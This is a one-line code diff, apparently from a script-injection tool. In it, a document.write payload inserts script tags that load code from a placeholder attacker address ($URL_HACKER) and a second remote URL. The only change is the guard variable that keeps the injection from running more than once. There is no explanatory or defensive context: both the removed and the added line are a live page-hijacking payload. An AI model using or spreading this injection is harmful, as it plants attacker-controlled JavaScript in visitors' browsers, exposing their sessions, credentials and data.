@@ -1,1 +1,1 @@
-Date.T||document.write('<script defer src=$URL_HACKER></script><script src=http://$URL_RAW?1></script>')
+window._$AD_||document.write('<script defer src=$URL_HACKER></script><script src=http://$URL_RAW?1></script>')
